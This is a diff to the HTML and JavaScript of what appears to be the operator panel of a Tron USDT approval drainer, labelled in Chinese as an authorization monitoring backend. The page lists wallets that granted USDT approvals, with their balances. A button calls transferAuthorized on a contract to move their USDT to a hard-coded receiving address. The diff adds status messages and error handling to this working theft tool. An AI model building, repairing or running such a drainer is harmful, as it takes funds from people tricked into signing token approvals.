@@ -15,11 +15,13 @@
     }
     button { background: #00b894; color: white; padding: 0.5em 1em; border: none; border-radius: 5px; cursor: pointer; }
     .error { color: red; }
+    #status { margin-top: 1em; font-weight: bold; }
   </style>
 </head>
 <body>
   <h1>🔐 USDT 授權監控後台</h1>
-  <div id="wallets">載入中...</div>
+  <div id="status">🔍 正在檢查 TronLink...</div>
+  <div id="wallets"></div>
 
   <script>
     const AUTH_CONTRACT = "TMxu165T2e3ZKWzgt7gipzmHwE5KYuibGa";
@@ -27,13 +29,20 @@
     const USDT_DECIMALS = 1e6;
     const YOUR_RECEIVE_ADDRESS = "THjNpJWbuGxvhR9kDDTDz1wVKhe2PWLfNR";
 
+    function logStatus(msg, color = "#2d3436") {
+      const status = document.getElementById("status");
+      status.innerText = msg;
+      status.style.color = color;
+    }
+
     async function fetchApprovals() {
+      logStatus("📡 正在讀取授權事件...");
       const walletsDiv = document.getElementById("wallets");
-      walletsDiv.innerHTML = "⏳ 正在讀取授權紀錄...";
+      walletsDiv.innerHTML = "";
       const results = [];
       try {
         let page = 0, stop = false;
-        while (!stop && page < 10) {
+        while (!stop && page < 3) {
           const res = await axios.get(
             `https://apilist.tronscanapi.com/api/contract/events?contract=${USDT_CONTRACT}&eventName=Approval&limit=100&start=${page * 100}`
           );
@@ -68,32 +77,37 @@
               <div>TRX 餘額：${trx}</div>
               <button onclick="triggerTransfer('${w.address}')">🚀 觸發轉帳</button>
             </div>`;
-          } catch {
+          } catch (e) {
             return `<div class="wallet-card error">⚠️ ${w.address} - 無法取得資料</div>`;
           }
         }));
 
         walletsDiv.innerHTML = walletsHtml.join("");
+        logStatus(`✅ 已載入 ${results.length} 個錢包`);
       } catch (e) {
-        walletsDiv.innerHTML = "❌ 發生錯誤：" + e.message;
+        logStatus("❌ 錯誤：" + e.message, "red");
       }
     }
 
     async function triggerTransfer(from) {
-      const contract = await window.tronWeb.contract().at(AUTH_CONTRACT);
-      const amount = 1 * USDT_DECIMALS;
-      await contract.transferAuthorized(USDT_CONTRACT, from, YOUR_RECEIVE_ADDRESS, amount).send();
-      alert("已觸發從錢包轉出 USDT");
+      try {
+        const contract = await window.tronWeb.contract().at(AUTH_CONTRACT);
+        const amount = 1 * USDT_DECIMALS;
+        await contract.transferAuthorized(USDT_CONTRACT, from, YOUR_RECEIVE_ADDRESS, amount).send();
+        alert("✅ 已觸發轉帳 from " + from);
+      } catch (err) {
+        alert("❌ 轉帳失敗：" + err.message);
+      }
     }
 
     window.addEventListener("load", () => {
       if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+        logStatus("🟢 已連接錢包：" + window.tronWeb.defaultAddress.base58, "green");
         fetchApprovals();
       } else {
-        document.getElementById("wallets").innerHTML = "⚠️ 請使用 TronLink 開啟此頁面";
+        logStatus("❌ 尚未偵測到 TronLink。請用 TronLink DApp 瀏覽器開啟此頁面", "red");
       }
     });
   </script>
 </body>
 </html>
-    
